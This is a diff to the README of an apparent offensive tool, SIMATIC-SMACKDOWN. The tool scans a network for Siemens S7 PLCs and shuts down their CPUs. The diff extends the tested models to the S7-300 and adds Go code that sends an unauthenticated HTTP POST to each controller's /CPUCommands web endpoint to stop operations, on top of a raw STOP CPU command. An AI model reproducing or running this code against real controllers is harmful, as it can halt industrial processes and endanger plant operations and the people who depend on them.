@@ -59,7 +59,7 @@ After determining the private IP address, the program enumerates the subnet for 
 	}
 	return scanned_ips
 ```
-Once the program identifies the PLCs, SIMATIC-SMACKDOWN launches a STOP CPU command via raw data to the controller. If the device is not password protected, it will turn off the PLC's CPU and stop operations. This functionality has only been tested on an S7-1200.
+Once the program identifies the PLCs, SIMATIC-SMACKDOWN launches a STOP CPU command via raw data to the controller. If the device is not password protected, it will turn off the PLC's CPU and stop operations. This functionality has only been tested on an S7-300 and S7-1200.
 
 ```go
 	// Connect to device ports
@@ -74,6 +74,32 @@ Once the program identifies the PLCs, SIMATIC-SMACKDOWN launches a STOP CPU comm
 		}
 		conn.Close()
 	}
+```
+
+After sending the termination command to the controller, the program sends an additional STOP CPU via the web interface. If the device is configured to "allow Everybody to change operating mode (Start/Stop)" in the webserver user management, this unauthenticated access will stop controller operations. 
+
+```go
+	for i := range scanned_ips {
+		client := &http.Client{}
+		var data = strings.NewReader(`Run=1&PriNav=Stop`)
+		req, err := http.NewRequest("POST", "http://"+scanned_ips[i]+"/CPUCommands", data)
+		if err != nil {
+			continue
+		}
+		req.Header.Set("Host", scanned_ips[i])
+		req.Header.Set("Content-Length", "19")
+		req.Header.Set("Cache-Control", "max-age=0")
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+		req.Header.Set("Origin", "http://"+scanned_ips[i])
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req.Header.Set("User-Agent", "Mozilla/5.0. (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
+		req.Header.Set("Accept", "text/html, application /xhmtl+xml, application/xml; q=0.9,image/avif, image/webp, image/apng,*/ - *; q=0.8, application/signed-exchange; v=b3; q=0.9")
+		req.Header.Set("Referer", "http://"+scanned_ips[i]+"/Portal/Portal.mwsl?PriNav=Start")
+		req.Header.Set("Accept-Encoding", "gzip, deflate")
+		req.Header.Set("Accept-Language", "en-US, en; q=0.9")
+		req.Header.Set("Connection", "close")
+		req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")
+		resp, err := client.Do(req)
 ```
 
 # Install: 
